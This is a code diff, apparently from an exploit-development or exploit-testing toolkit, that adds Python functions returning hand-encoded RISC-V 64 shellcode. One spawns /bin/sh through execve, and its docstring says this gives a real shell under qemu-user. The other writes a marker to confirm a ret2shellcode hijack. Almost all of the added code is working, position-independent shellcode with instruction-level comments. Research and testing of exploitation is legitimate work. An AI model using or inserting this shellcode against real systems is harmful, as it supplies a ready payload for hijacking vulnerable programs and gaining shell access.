@@ -226,6 +226,43 @@ def write_marker_arm(marker: bytes) -> bytes:
     ) + marker
 
 
+def execve_binsh_riscv64() -> bytes:
+    """RISC-V 64 execve("/bin/sh", NULL, NULL) -- 32 bytes, position-independent (`auipc a0,0` +
+    `addi a0,a0,24` points a0 at the "/bin/sh\\0" appended after the 24-byte code). Under qemu-user
+    this spawns a REAL shell (the guest execve is relayed to the host). All 4-byte, no compressed
+    insns, so the +24 offset is exact; assembled against riscv64-linux-gnu-as (-march=rv64g) and run
+    under qemu-riscv64."""
+    return struct.pack(
+        "<6I",
+        0x00000517,                      # auipc a0, 0          ; a0 = PC here
+        0x01850513,                      # addi  a0, a0, 24     ; a0 -> "/bin/sh"
+        0x00000593,                      # addi  a1, zero, 0    ; argv = NULL
+        0x00000613,                      # addi  a2, zero, 0    ; envp = NULL
+        0x0DD00893,                      # addi  a7, zero, 221  ; __NR_execve
+        0x00000073,                      # ecall
+    ) + b"/bin/sh\x00"
+
+
+def write_marker_riscv64(marker: bytes) -> bytes:
+    """RISC-V 64 write(1, marker, len); exit(0). Position-independent (`auipc a1,0` + `addi a1,a1,36`
+    points a1 at the marker after the fixed 9-instruction/36-byte code); the length immediate is
+    patched into `addi a2,zero,len`. Confirms a cross-arch ret2shellcode by a WRITTEN marker when a
+    shell does not come up. Encodings assembled against riscv64-linux-gnu-as + run under qemu."""
+    n = len(marker) & 0xFFF
+    return struct.pack(
+        "<9I",
+        0x00000597,                      # auipc a1, 0
+        0x02458593,                      # addi  a1, a1, 36     ; a1 -> marker
+        0x00100513,                      # addi  a0, zero, 1    ; fd = stdout
+        0x00000613 | (n << 20),          # addi  a2, zero, len
+        0x04000893,                      # addi  a7, zero, 64   ; __NR_write
+        0x00000073,                      # ecall
+        0x00000513,                      # addi  a0, zero, 0
+        0x05D00893,                      # addi  a7, zero, 93   ; __NR_exit
+        0x00000073,                      # ecall
+    ) + marker
+
+
 def write_marker_aarch64(marker: bytes) -> bytes:
     """AArch64 write(1, marker, len); exit(93). Position-independent: `adr x1, marker` addresses the
     marker bytes appended after the fixed 7-instruction (28-byte) code, PC-relative, so the stub
